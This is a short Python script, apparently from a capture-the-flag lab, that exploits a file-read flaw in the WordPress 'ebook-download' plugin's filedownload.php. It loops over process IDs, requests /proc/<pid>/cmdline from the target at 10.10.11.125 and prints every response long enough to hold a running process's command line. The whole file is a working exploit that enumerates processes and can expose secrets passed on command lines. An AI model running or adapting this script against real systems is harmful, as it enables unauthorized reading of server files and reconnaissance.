import re
import requests

for x in range(0,1000):
	url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/" + str(x) + "/cmdline"
	r = requests.get(url)
	len_of_resp = len(r.content)
	
	if (len_of_resp > 82):
		print("URL: "+r.url)
		print(len_of_resp)
		print("Length: " +str(len_of_resp)+ "\n")
		content = r.content
		print(re.split("/cmdline/", str(content)))
		print("----------------------------------")